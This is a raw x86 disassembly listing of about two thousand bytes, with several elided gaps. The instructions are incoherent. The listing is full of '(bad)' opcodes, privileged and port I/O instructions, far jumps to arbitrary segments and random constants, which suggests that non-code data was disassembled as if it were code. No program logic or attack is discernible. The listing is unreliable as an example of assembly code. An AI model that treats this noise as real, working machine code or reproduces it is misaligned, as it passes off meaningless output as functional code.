  4268a6:	scas   eax,DWORD PTR es:[edi]
  4268a7:	retf   0x6096
  4268aa:	add    ebx,0xfffffff7
  4268ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268ae:	push   edx
  4268af:	ror    ebx,1
  4268b1:	dec    ecx
  4268b2:	loope  0x42688b
  4268b4:	iret   
  4268b5:	stos   DWORD PTR es:[edi],eax
  4268b6:	bound  esp,QWORD PTR [esi+0x61]
  4268b9:	mov    ebp,0xdde5873b
  4268be:	mov    cl,0x34
  4268c0:	add    al,BYTE PTR [ebx-0x4a]
  4268c3:	aaa    
  4268c4:	sub    DWORD PTR ds:0xacef6787,0xffffffdb
  4268cb:	imul   ebp
  4268cd:	(bad)  
  4268ce:	fs xchg ecx,eax
  4268d0:	lods   al,BYTE PTR ds:[esi]
  4268d1:	cmc    
  4268d2:	mov    ah,0xb6
  4268d4:	mov    DWORD PTR es:[esi-0x133b69fa],ebx
  4268db:	mov    dh,0xc2
  4268dd:	add    al,0xc1
  4268df:	js     0x4268db
  4268e1:	inc    eax
  4268e2:	cmp    eax,0xedc122e8
  4268e7:	xchg   BYTE PTR [ecx+edx*8],bl
  4268ea:	cs repnz and eax,0x8540c2cb
  4268f1:	cmp    BYTE PTR [ebx+ebp*2+0x2b4e1499],ah
  4268f8:	mov    edx,0x71898dd4
  4268fd:	in     al,0x9a
  4268ff:	fild   DWORD PTR [eax-0x4c]
  426902:	push   ss
  426903:	fimul  WORD PTR [eax]
  426905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426906:	push   ebp
  426907:	push   cs
  426908:	fisub  DWORD PTR [ebx-0x69]
  42690b:	in     al,0x31
  42690d:	lods   eax,DWORD PTR ds:[esi]
  42690e:	mov    ch,0x93
  426910:	ror    edx,cl
  426912:	aas    
  426913:	mov    esp,0x7dce4fb6
  426918:	popa   
  426919:	mov    dh,0xc8
  42691b:	pop    esp
  42691c:	push   ds
  42691d:	lahf   
  42691e:	jmp    0x852c74be
  426923:	add    DWORD PTR [edx-0x16],esp
  426926:	push   ds
  426927:	fsub   QWORD PTR [eax+edx*1-0x67]
  42692b:	out    dx,al
  42692c:	in     al,0x1a
  42692e:	neg    DWORD PTR [ecx-0x4d]
  426931:	sub    al,0xb1
  426933:	mov    ebp,0x490b7a07
  426938:	fiadd  DWORD PTR [ebx]
  42693a:	dec    eax
  42693b:	ss or  eax,0xf87dc6d6
  426941:	add    BYTE PTR ss:[eax],al
	...
  4269b4:	shl    DWORD PTR [ebx+0x4],0x67
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	test   eax,0x2a3dde5a
  4269c5:	fwait
  4269c6:	add    DWORD PTR [eax],eax
  4269c8:	test   BYTE PTR [eax],0x0
  4269cb:	add    BYTE PTR [edi+eiz*4+0x4ff8ce36],bl
  4269d2:	sti    
  4269d3:	mov    esp,0xc1ad5759
  4269d8:	adc    ebp,DWORD PTR [edi+0x49]
  4269db:	pop    esi
  4269dc:	adc    esi,ebp
  4269de:	mov    edx,esi
  4269e0:	dec    esi
  4269e1:	jmp    0x88018eff
  4269e6:	and    bh,BYTE PTR [edi+0x2010da04]
  4269ec:	sub    al,0x3
  4269ee:	jo     0x426a59
  4269f0:	pop    ebp
  4269f1:	jle    0x426a49
  4269f3:	xor    cl,BYTE PTR [esi-0x2660fad5]
  4269f9:	fnstsw WORD PTR [ebx-0x40]
  4269fc:	sub    edi,DWORD PTR [ebx+0x12]
  4269ff:	test   eax,0xe92a7b53
  426a05:	imul   edi,DWORD PTR [edx+ebp*8-0x5],0x4a
  426a0a:	int3   
  426a0b:	aam    0xbd
  426a0d:	pop    ecx
  426a0e:	xor    eax,DWORD PTR [ebx]
  426a10:	mov    esi,0x11f5724e
  426a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a16:	scas   al,BYTE PTR es:[edi]
  426a17:	mov    ecx,0x3e6abf87
  426a1c:	loopne 0x426a94
  426a1e:	xchg   edx,eax
  426a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a20:	mov    edx,0x7eb101c1
  426a25:	in     eax,dx
  426a26:	push   0x97432f68
  426a2b:	push   ss
  426a2c:	sbb    esp,DWORD PTR [ecx+0x55cc18ba]
  426a32:	(bad)  
  426a33:	scas   al,BYTE PTR es:[edi]
  426a34:	imul   edi,edi,0xfffffff3
  426a37:	jno    0x426a3e
  426a39:	daa    
  426a3a:	mov    al,ds:0x493003e1
  426a3f:	int    0x11
  426a41:	rep outs dx,DWORD PTR ds:[esi]
  426a43:	jl     0x4269e8
  426a45:	add    esi,DWORD PTR [ecx-0x63]
  426a48:	shr    DWORD PTR es:[ebx+0x293b2f3b],0xdf
  426a50:	or     BYTE PTR [edi-0x2f05e5b5],ah
  426a56:	test   BYTE PTR [edx+0x4005af54],dl
  426a5c:	jmp    0x4269e9
  426a5e:	scas   al,BYTE PTR es:[edi]
  426a5f:	gs out dx,eax
  426a61:	out    dx,al
  426a62:	aam    0x68
  426a64:	pop    esp
  426a65:	xlat   BYTE PTR ds:[ebx]
  426a66:	test   BYTE PTR [edx],ah
  426a68:	loop   0x426a2f
  426a6a:	(bad)  
  426a6b:	sbb    eax,0xef53343
  426a70:	adc    eax,0xc8c082c7
  426a75:	mov    ah,0x97
  426a77:	jmp    0x9ad3:0x9b1dd73
  426a7e:	dec    ebp
  426a7f:	pushf  
  426a80:	hlt    
  426a81:	cdq    
  426a82:	out    dx,al
  426a83:	xor    ebx,DWORD PTR [ecx+0x75]
  426a86:	jb     0x426a94
  426a88:	xchg   edi,eax
  426a89:	xor    DWORD PTR [ebp-0x6],ebx
  426a8c:	ficom  WORD PTR [eax+0x42]
  426a8f:	mov    ah,0xa5
  426a91:	popf   
  426a92:	popf   
  426a93:	bound  ebp,QWORD PTR [edi-0x4a]
  426a96:	jo     0x426ae8
  426a98:	sti    
  426a99:	cmp    eax,0x4430d88d
  426a9e:	je     0x426a2e
  426aa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa1:	scas   al,BYTE PTR es:[edi]
  426aa2:	sub    ebx,DWORD PTR [esp+ebp*2]
  426aa5:	adc    esp,DWORD PTR [ecx]
  426aa7:	mov    WORD PTR [edi-0xb],ds
  426aaa:	and    dh,BYTE PTR [esi+0x68]
  426aad:	hlt    
  426aae:	xor    DWORD PTR [ecx+0x6289461b],ecx
  426ab4:	out    0xb,eax
  426ab6:	jnp    0x426aa2
  426ab8:	mov    eax,ds:0x7fcbc49b
  426abd:	jmp    0x426a4f
  426abf:	adc    dh,BYTE PTR [ecx-0xa]
	...
  426b32:	add    BYTE PTR [eax],al
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	or     BYTE PTR [edi],dh
  426b42:	xlat   BYTE PTR ds:[ebx]
  426b43:	mov    eax,ds:0x19c20
  426b48:	test   BYTE PTR [eax],0x0
  426b4b:	add    BYTE PTR [ebx],al
  426b4d:	push   edi
  426b4e:	fwait
  426b4f:	js     0x426b2c
  426b51:	and    al,0x18
  426b53:	xor    eax,0xd04851a8
  426b59:	xchg   esi,eax
  426b5a:	outs   dx,DWORD PTR ds:[esi]
  426b5b:	stos   BYTE PTR es:[edi],al
  426b5c:	scas   al,BYTE PTR es:[edi]
  426b5d:	inc    ecx
  426b5e:	sahf   
  426b5f:	jne    0x426b6f
  426b61:	adc    ch,bh
  426b63:	test   DWORD PTR [ecx+0xc],esp
  426b66:	inc    ebx
  426b67:	(bad)  [esi]
  426b69:	push   ds
  426b6a:	loope  0x426b64
  426b6c:	enter  0x52d5,0xe1
  426b70:	retf   0x652d
  426b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426b74:	test   BYTE PTR [esi+0x55],cl
  426b77:	je     0x426afd
  426b79:	mov    edi,0xbaf427df
  426b7e:	sar    BYTE PTR [edi],0x48
  426b81:	lea    ecx,[edi+ebp*4]
  426b84:	sbb    DWORD PTR [edx+eiz*4+0x17],ebx
  426b88:	add    eax,0x78e5a555
  426b8d:	pop    ds
  426b8e:	shl    BYTE PTR [edx],cl
  426b90:	sub    eax,0x21fb00e5
  426b95:	push   es
  426b96:	inc    edi
  426b97:	mov    cl,0xa6
  426b99:	leave  
  426b9a:	ins    BYTE PTR es:[edi],dx
  426b9b:	test   al,0x6e
  426b9d:	push   ss
  426b9e:	pop    es
  426b9f:	inc    ebp
  426ba0:	pusha  
  426ba1:	aam    0x67
  426ba3:	xchg   ebx,eax
  426ba4:	hlt    
  426ba5:	sbb    al,0xd8
  426ba7:	pop    edx
  426ba8:	adc    DWORD PTR [edi+0x44c7fde3],0x56
  426baf:	stc    
  426bb0:	dec    edi
  426bb1:	popa   
  426bb2:	lods   eax,DWORD PTR ds:[esi]
  426bb3:	push   0xffffff91
  426bb5:	adc    DWORD PTR [ebp-0x7aff579c],ebx
  426bbb:	mov    ch,0xb4
  426bbd:	loope  0x426b64
  426bbf:	sub    al,0x6a
  426bc1:	aam    0xc4
  426bc3:	push   esp
  426bc4:	xor    BYTE PTR [ebp+0x2],bh
  426bc7:	pop    ss
  426bc8:	mov    edi,DWORD PTR [ebx-0x78]
  426bcb:	mov    eax,ds:0x96981fed
  426bd0:	repz push edx
  426bd2:	inc    ecx
  426bd3:	gs das 
  426bd5:	jo     0x426bd2
  426bd7:	mov    ah,0x30
  426bd9:	shl    DWORD PTR [edx],1
  426bdb:	imul   esi,DWORD PTR [ebx-0x1f],0xd95fb4a5
  426be2:	mov    ebp,0x631f20c3
  426be7:	jmp    0x18f3f5d2
  426bec:	xchg   ebx,eax
  426bed:	jmp    0x426bb5
  426bef:	lds    ebp,FWORD PTR [ecx+0x28]
  426bf2:	aas    
  426bf3:	sub    cl,dh
  426bf5:	xchg   ecx,eax
  426bf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bf7:	xchg   edi,eax
  426bf8:	xchg   ebx,eax
  426bf9:	scas   al,BYTE PTR es:[edi]
  426bfa:	push   ebx
  426bfb:	push   ds
  426bfc:	sar    ebx,1
  426bfe:	fiadd  DWORD PTR [edx-0x5e]
  426c01:	ds lods al,BYTE PTR ds:[esi]
  426c04:	sub    BYTE PTR ds:0x8b8381bb,bh
  426c0a:	iret   
  426c0b:	aad    0xe6
  426c0d:	cmp    BYTE PTR ds:0x7deab2c3,ah
  426c13:	push   ecx
  426c14:	pop    esp
  426c15:	shl    DWORD PTR [edi-0x18abb9e],1
  426c1b:	jns    0x426bb5
  426c1d:	enter  0x6133,0x94
  426c21:	loopne 0x426bf4
  426c23:	test   DWORD PTR [ebp-0x3216b2f2],ecx
  426c29:	leave  
  426c2a:	sub    dh,ch
  426c2c:	sbb    eax,0xdc7f0da1
  426c31:	in     al,dx
  426c32:	neg    bl
  426c34:	adc    eax,0x5dd4bc72
  426c39:	xchg   ebp,eax
  426c3a:	xlat   BYTE PTR ds:[ebx]
  426c3b:	(bad)  
  426c3c:	pushf  
  426c3d:	mov    edx,0x21dc79dc
	...
  426cb2:	add    BYTE PTR [eax],al
  426cb4:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	xchg   ebx,eax
  426cc1:	xlat   BYTE PTR ds:[ebx]
  426cc2:	pop    ds
  426cc3:	jg     0x426cdb
  426cc5:	popf   
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	test   BYTE PTR [eax],0x0
  426ccb:	add    BYTE PTR ds:0xec028cdd,ch
  426cd1:	jno    0x426d00
  426cd3:	in     al,0xd3
  426cd5:	cmc    
  426cd6:	xchg   esi,eax
  426cd7:	hlt    
  426cd8:	or     BYTE PTR [eax+edx*2+0x37],ch
  426cdc:	add    bh,BYTE PTR [esi]
  426cde:	sbb    BYTE PTR [esi+0x24d1cbbf],ch
  426ce4:	lahf   
  426ce5:	mov    dl,0x33
  426ce7:	push   esp
  426ce8:	dec    ebp
  426ce9:	inc    edi
  426cea:	test   BYTE PTR [edi],0x4d
  426ced:	fadd   st,st(5)
  426cef:	repz mov ah,0x28
  426cf2:	xchg   ebp,eax
  426cf3:	pop    ecx
  426cf4:	into   
  426cf5:	inc    esp
  426cf6:	pop    eax
  426cf7:	pop    esi
  426cf8:	clc    
  426cf9:	jecxz  0x426d08
  426cfb:	fsubr  QWORD PTR [edx]
  426cfd:	xchg   ecx,eax
  426cfe:	cld    
  426cff:	and    DWORD PTR [esi],esp
  426d01:	mov    cl,0x7f
  426d03:	imul   ebp,ebp,0xc3a5f03c
  426d09:	mov    ch,ch
  426d0b:	out    0xe2,eax
  426d0d:	adc    BYTE PTR [ebx-0x16915a8c],dh
  426d13:	sub    DWORD PTR [esi-0x50752f7e],ebx
  426d19:	mov    ebp,0xa1f5dd5b
  426d1e:	bound  esp,QWORD PTR [edi+0x32]
  426d21:	sahf   
  426d22:	hlt    
  426d23:	jecxz  0x426d25
  426d25:	cmp    ch,BYTE PTR [ebx]
  426d27:	pop    ecx
  426d28:	aam    0x92
  426d2a:	add    dl,bl
  426d2c:	test   DWORD PTR [edi-0x1153d09a],0xadc11790
  426d36:	es mov cx,0x5950
  426d3b:	es and edi,edi
  426d3e:	pop    ebp
  426d3f:	jle    0x426cdb
  426d41:	mov    esi,ecx
  426d43:	dec    ecx
  426d44:	mov    ds:0x826b036a,eax
  426d49:	inc    ebx
  426d4a:	bound  esp,QWORD PTR [edi+0x47ed2238]
  426d50:	test   eax,0x10646f39
  426d55:	push   0x914d4d96
  426d5a:	adc    BYTE PTR [ebp-0x11b8bc09],bh
  426d60:	es mov ebp,0xe1febec9
  426d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d67:	outs   dx,BYTE PTR ds:[esi]
  426d68:	nop
  426d69:	stos   DWORD PTR es:[edi],eax
  426d6a:	push   es
  426d6b:	out    0xdb,al
  426d6d:	pop    ebp
  426d6e:	imul   edx,DWORD PTR [esi+0x1d6893a0],0x7dd9a356
  426d78:	lock and al,0xca
  426d7b:	add    DWORD PTR [edx],esp
  426d7d:	(bad)  
  426d7e:	mov    ebx,0x316d9f7d
  426d83:	inc    ecx
  426d84:	lahf   
  426d85:	cmp    DWORD PTR [ebp-0x23b37be6],eax
  426d8b:	xchg   edi,eax
  426d8c:	std    
  426d8d:	xchg   esi,eax
  426d8e:	sbb    ebx,DWORD PTR [edx]
  426d90:	jbe    0x426daf
  426d92:	ret    
  426d93:	mov    ah,0x80
  426d95:	xchg   BYTE PTR [eax+0x7cb629a4],bh
  426d9b:	mov    ecx,0x1af3b4a1
  426da0:	xchg   ecx,eax
  426da1:	xchg   BYTE PTR [eax-0x67],bl
  426da4:	sbb    ecx,DWORD PTR [edi+0x2aae0a41]
  426daa:	into   
  426dab:	mov    bh,0xd3
  426dad:	cmp    DWORD PTR [edx+0x16],ecx
  426db0:	push   0x51
  426db2:	fld    DWORD PTR [esi]
  426db4:	imul   ecx,DWORD PTR [eax-0x71],0x5807dc0a
  426dbb:	cmc    
  426dbc:	jp     0x426d4f
  426dbe:	inc    esp
  426dbf:	cli    
  426dc0:	repnz cdq 
	...
  426e32:	add    BYTE PTR [eax],al
  426e34:	(bad)  
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	into   
  426e41:	es cli 
  426e43:	mov    ch,0xc
  426e45:	sahf   
  426e46:	add    DWORD PTR [eax],eax
  426e48:	test   BYTE PTR [eax],0x0
  426e4b:	add    BYTE PTR [ecx-0x365e2660],al
  426e51:	xor    cl,BYTE PTR [ebx-0x1bf9efda]
  426e57:	enter  0x7ff5,0x9d
  426e5b:	icebp  
  426e5c:	test   al,0x5e
  426e5e:	add    DWORD PTR [eax+0x4b2e4929],esi
  426e64:	ins    DWORD PTR es:[edi],dx
  426e65:	mov    edi,0x30ebdee9
  426e6a:	jnp    0x426e19
  426e6c:	jne    0x426e64
  426e6e:	xchg   edi,eax
  426e6f:	scas   al,BYTE PTR es:[edi]
  426e70:	or     eax,edx
  426e72:	xchg   BYTE PTR [ebp-0x6a6085d3],bh
  426e78:	and    eax,0x106fa667
  426e7d:	jae    0x426e75
  426e7f:	mov    al,ds:0x9962fbc6
  426e84:	adc    dh,BYTE PTR [esi]
  426e86:	mov    WORD PTR [esi],ss
  426e88:	clc    
  426e89:	and    ch,bh
  426e8b:	pop    ebx
  426e8c:	jle    0x426e1a
  426e8e:	or     dl,BYTE PTR [edx]
  426e90:	mov    ds,WORD PTR [edx]
  426e92:	nop
  426e93:	dec    eax
  426e94:	inc    eax
  426e95:	add    DWORD PTR [esi-0x35f34a59],ebx
  426e9b:	cmp    al,0xc1
  426e9d:	or     DWORD PTR [ecx+0x6318168c],0x7e15e32c
  426ea7:	addr16 adc eax,0x634ae220
  426ead:	retf   
  426eae:	mov    esi,0x880c9c14
  426eb3:	mov    esp,0x6ef70e37
  426eb8:	or     al,0xea
  426eba:	aam    0x72
  426ebc:	mov    dh,0xf6
  426ebe:	shl    WORD PTR [ebp+eax*4+0x2979755e],cl
  426ec6:	and    ah,BYTE PTR [ecx+0x36]
  426ec9:	dec    edx
  426eca:	and    eax,0xd5f4ed27
  426ecf:	rcr    ecx,1
  426ed1:	in     eax,dx
  426ed2:	sbb    BYTE PTR [ebp-0x7],0x5a
  426ed6:	push   ecx
  426ed7:	sub    edx,DWORD PTR [ebx+0x72]
  426eda:	int    0x14
  426edc:	in     al,dx
  426edd:	cld    
  426ede:	mov    dh,dh
  426ee0:	pusha  
  426ee1:	xchg   edi,eax
  426ee2:	push   edi
  426ee3:	sub    BYTE PTR [edi],dh
  426ee5:	pop    es
  426ee6:	in     al,dx
  426ee7:	fwait
  426ee8:	mov    al,ds:0x5040ec8e
  426eed:	idiv   DWORD PTR ds:[ebp+eax*8+0x4419e0af]
  426ef5:	jp     0x426e78
  426ef7:	push   0xffffffae
  426ef9:	xchg   edx,eax
  426efa:	aam    0x94
  426efc:	loope  0x426eff
  426efe:	mov    ebx,0xe2856f9c
  426f03:	addr16 hlt 
  426f05:	xor    BYTE PTR [bp+si],dh
  426f08:	les    eax,FWORD PTR [edx-0x26be5d32]
  426f0e:	xchg   ecx,eax
  426f0f:	mov    esp,0x642ff92
  426f14:	cmp    DWORD PTR ds:[ebx-0x656639d],0xf7fabdff
  426f1f:	lds    esp,FWORD PTR ds:0x7b522f19
  426f25:	cmp    ebx,edx
  426f27:	fdivrp st(6),st
  426f29:	sub    al,0xff
  426f2b:	pusha  
  426f2c:	ret    0x13d
  426f2f:	arpl   WORD PTR [ecx],si
  426f31:	pop    ds
  426f32:	js     0x426f71
  426f34:	adc    BYTE PTR [eax-0x7309bbca],0x35
  426f3b:	jg     0x426f15
  426f3d:	mov    ebp,DWORD PTR [edx]
  426f3f:	jecxz  0x426f8a
	...
  426fb1:	add    BYTE PTR [eax],al
  426fb3:	add    BYTE PTR [ecx],bh
  426fb5:	cwde   
  426fb6:	or     eax,DWORD PTR [esi]
  426fb8:	stos   DWORD PTR es:[edi],eax
  426fb9:	xchg   edi,eax
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	xchg   ebp,eax
  426fc1:	(bad)  
  426fc2:	aaa    
  426fc3:	add    BYTE PTR [edx],0x9f
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	test   BYTE PTR [eax],0x0
  426fcb:	add    BYTE PTR [esi],dh
  426fcd:	and    ah,BYTE PTR [edx-0x37d549d3]
  426fd3:	or     BYTE PTR [ebx-0x4d5fe946],ch
  426fd9:	adc    eax,DWORD PTR [esi]
  426fdb:	fbstp  TBYTE PTR [ebp+ebx*1-0x5e]
  426fdf:	pop    edi
  426fe0:	cwde   
  426fe1:	adc    DWORD PTR [ecx+0x41],0x2fc10f70
  426fe8:	push   edx
  426fe9:	cld    
  426fea:	fisubr DWORD PTR [ebx+0xe]
  426fed:	push   ds
  426fee:	gs cmp eax,0x97c6f227
  426ff4:	repz sbb al,BYTE PTR [esp+eiz*4-0x51]
  426ff9:	loop   0x427012
  426ffb:	cmp    BYTE PTR [edx-0x4fdec2c6],ch
  427001:	ins    DWORD PTR es:[edi],dx
  427002:	xchg   esp,eax
  427003:	out    0x6,eax
  427005:	push   0xe989f5b7
  42700a:	and    al,0x2e
  42700c:	mov    BYTE PTR [ecx+0x7c],bl
  42700f:	loop   0x427035
  427011:	imul   edx,DWORD PTR [eax+edi*8-0x3a484fcf],0xdf734216
  42701c:	add    bl,BYTE PTR [ebp+0x14]
  42701f:	dec    edx
  427020:	adc    eax,edi
  427022:	test   DWORD PTR [edi+0xa12046c],edi
  427028:	xchg   DWORD PTR ds:0x28dc88d,eax
  42702e:	hlt    
  42702f:	ss mov esi,0x3e57770e
  427035:	sti    
  427036:	mul    DWORD PTR [ebx]
  427038:	aaa    
  427039:	xor    ecx,esp
  42703b:	sub    eax,0xe31e6f7b
  427040:	fisttp QWORD PTR [edx]
  427042:	outs   dx,BYTE PTR ds:[esi]
  427043:	push   ebx
  427044:	das    
  427045:	aaa    
  427046:	push   0xffffffe2
  427048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427049:	cmp    ebx,DWORD PTR [esi-0x6c586e6f]
  42704f:	mov    ecx,0xa4abd892
  427054:	sbb    dh,bl
  427056:	(bad)  
  427057:	dec    BYTE PTR [edx+0x4f759acb]
  42705d:	dec    ebx
  42705e:	push   0xffffffa9
  427060:	jmp    0x426fff
  427062:	xlat   BYTE PTR ds:[ebx]
  427063:	sbb    bl,BYTE PTR [eax]
  427065:	sbb    bl,bl
  427067:	outs   dx,DWORD PTR ds:[esi]
  427068:	add    BYTE PTR ss:[ebp+0x5dc96ed3],cl
  42706f:	jg     0x42707f
  427071:	pop    edi
  427072:	lods   eax,DWORD PTR ds:[esi]
  427073:	cmp    BYTE PTR [eax+0x50],bl
  427076:	test   ebx,edx
  427078:	sahf   
  427079:	sbb    ecx,eax
  42707b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42707d:	mov    al,0x85
  42707f:	shr    DWORD PTR ds:[esi+0x6fc75d67],0x70
  427087:	dec    esp
  427088:	pop    ss
  427089:	or     esi,DWORD PTR ds:0xa7fdb1dd
  42708f:	test   eax,0x63f16a97
  427094:	mov    edi,0xee491523
  427099:	mov    al,ds:0xff5b753a
  42709e:	xchg   dl,cl
  4270a0:	sbb    al,0x30
  4270a2:	push   ds
  4270a3:	ss push cs
  4270a5:	arpl   WORD PTR [edi+0x27],ax
  4270a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270a9:	punpckhdq mm7,QWORD PTR [edi+0x6]
  4270ad:	gs inc esi
  4270af:	mov    bl,0x7b
  4270b1:	dec    eax
  4270b2:	aaa    
  4270b3:	out    0x52,eax
  4270b5:	adc    al,0x5e
  4270b7:	repnz outs dx,BYTE PTR ds:[esi]
  4270b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270ba:	test   eax,0xd3dd059b
  4270bf:	into   
  4270c0:	cmp    dh,BYTE PTR [ebp+0x0]
	...
  427133:	add    BYTE PTR [ebx-0x409ef0df],bl
  427139:	outs   dx,DWORD PTR ds:[esi]
  42713a:	(bad)  
  42713b:	sti    
  42713c:	into   
  42713d:	aad    0x24
  42713f:	aam    0x25
  427141:	cmp    ecx,DWORD PTR [esi]
  427143:	sub    eax,edi
  427145:	lahf   
  427146:	add    DWORD PTR [eax],eax
  427148:	test   BYTE PTR [eax],0x0
  42714b:	add    BYTE PTR [eax+0x5c4d49d5],bh
  427151:	sbb    al,0xda
  427153:	ret    
  427154:	fcomp  DWORD PTR [edx]
  427156:	call   0xe4af:0xedd05f1
  42715d:	rcr    ebp,cl
  42715f:	mov    esi,0xbe059333
  427164:	jo     0x4270f0
  427166:	sar    BYTE PTR [ebx-0xa],cl
  427169:	or     DWORD PTR [ebx],ecx
  42716b:	cs jns 0x42711c
  42716e:	dec    ebx
  42716f:	dec    ecx
  427170:	sub    DWORD PTR [ecx+0x48256187],ecx
  427176:	fiadd  WORD PTR ds:0x7e1d26b3
  42717c:	ins    BYTE PTR es:[edi],dx
  42717d:	inc    edi
  42717e:	leave  
  42717f:	add    BYTE PTR [edx+ecx*2],cl
  427182:	cmovno ebp,DWORD PTR [ebp+0x6b930b01]
  427189:	jmp    0x10b2:0x50d1687b
  427190:	cmp    ch,cl
  427192:	mov    ds:0x6fdc1d8c,eax
  427197:	inc    esi
  427198:	push   ds
  427199:	xchg   BYTE PTR [eax],dh
  42719b:	repz fisttp WORD PTR [esi]
  42719e:	cli    
  42719f:	mov    bh,0xb6
  4271a1:	dec    eax
  4271a2:	cmc    
  4271a3:	test   al,0x20
  4271a5:	mov    ch,0x8f
  4271a7:	add    ebp,DWORD PTR [ebx]
  4271a9:	pop    es
  4271aa:	call   0x931b:0x73a932d1
  4271b1:	fimul  WORD PTR [esi+ecx*4+0x38a7c40b]
  4271b8:	mov    ds:0xe0cc37a5,al
  4271bd:	mov    bh,0x13
  4271bf:	(bad)  
  4271c0:	lock aad 0x7b
  4271c3:	push   0xad37f496
  4271c8:	mov    esp,0x45e72020
  4271cd:	fdivr  st(5),st
  4271cf:	pop    edx
  4271d0:	fwait
  4271d1:	pop    edi
  4271d2:	and    eax,0x5ea182a2
  4271d7:	repz jmp 0xb9b2:0xc3768639
  4271df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271e0:	shl    DWORD PTR [esi-0x66],1
  4271e3:	sub    BYTE PTR [eax+0x48994f5c],dl
  4271e9:	mov    ebp,cs
  4271eb:	mov    esp,0xdc0a7c96
  4271f0:	xor    al,0x67
  4271f2:	fisub  DWORD PTR [edi+ebp*8-0x2f]
  4271f6:	popf   
  4271f7:	jecxz  0x4271c3
  4271f9:	into   
  4271fa:	xchg   edi,eax
  4271fb:	rol    bl,1
  4271fd:	mov    ebx,0x408780aa
  427202:	push   cs
  427203:	jmp    0xa0d4:0xeee82f21
  42720a:	pop    edx
  42720b:	jmp    0xd882974a
  427210:	push   es
  427211:	fnstsw WORD PTR [edi]
  427213:	jge    0x4271b8
  427215:	jg     0x42719c
  427217:	push   eax
  427218:	xor    BYTE PTR [ecx],dh
  42721a:	inc    esi
  42721b:	clc    
  42721c:	mov    dl,0x57
  42721e:	std    
  42721f:	mov    bh,0x64
  427221:	dec    esi
  427222:	enter  0xa39c,0x9b
  427226:	hlt    
  427227:	or     DWORD PTR [esi-0x23],esi
  42722a:	mov    edi,0xb86fb784
  42722f:	inc    esi
  427230:	(bad)  
  427231:	std    
  427232:	cmp    BYTE PTR [esi-0x2],dl
  427235:	fist   WORD PTR [ecx+0xc90df0b]
  42723b:	pushf  
  42723c:	int3   
  42723d:	outs   dx,BYTE PTR ds:[esi]
  42723e:	xchg   bl,bl
  427240:	push   0x7e
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0xfe80ba68
  4272c4:	out    dx,al
  4272c5:	mov    al,ds:0xf60001
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	std    
  4272cd:	mov    ah,0x82
  4272cf:	pop    ss
  4272d0:	dec    edi
  4272d1:	(bad)  
  4272d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272d3:	cmp    dl,bh
  4272d5:	inc    ecx
  4272d6:	int3   
  4272d7:	and    BYTE PTR [ecx+0x1bf466c1],cl
  4272dd:	jb     0x42732c
  4272df:	fild   DWORD PTR [ebp+0x61208193]
  4272e5:	test   edi,edx
  4272e7:	inc    edx
  4272e8:	cmc    
  4272e9:	in     eax,0x47
  4272eb:	cmp    ah,cl
  4272ed:	js     0x427299
  4272ef:	(bad)  
  4272f1:	sub    ah,BYTE PTR [edi+0x3bf7c4da]
  4272f7:	sub    bh,ch
  4272f9:	stc    
  4272fa:	dec    ebp
  4272fb:	push   ebx
  4272fc:	jg     0x427287
  4272fe:	or     BYTE PTR [edi+0x3d],0xc5
  427302:	mov    cl,0xc5
  427304:	jno    0x427301
  427306:	sbb    DWORD PTR [edx-0x36],0xffffff82
  42730a:	out    dx,al
  42730b:	and    dl,BYTE PTR [ebx+0x20]
  42730e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42730f:	or     ebx,DWORD PTR [ecx]
  427311:	pop    esp
  427312:	xchg   BYTE PTR [ebp+0xf66c5c0],ch
  427318:	gs xchg edi,eax
  42731a:	xor    bl,bl
  42731c:	mov    eax,0x2cd79276
  427321:	das    
  427322:	add    al,0xb7
  427324:	hlt    
  427325:	cmp    esi,edx
  427327:	or     eax,0x1c69b9ac
  42732c:	pusha  
  42732d:	pusha  
  42732e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42732f:	xchg   ecx,eax
  427330:	stos   DWORD PTR es:[edi],eax
  427331:	or     al,0xd5
  427333:	out    dx,al
  427334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427335:	xchg   ebp,eax
  427336:	cmp    edi,edx
  427338:	mov    edx,0xd3eb918
  42733d:	and    al,BYTE PTR [esi+0x1c4ef6aa]
  427343:	ja     0x427379
  427345:	stos   BYTE PTR es:[edi],al
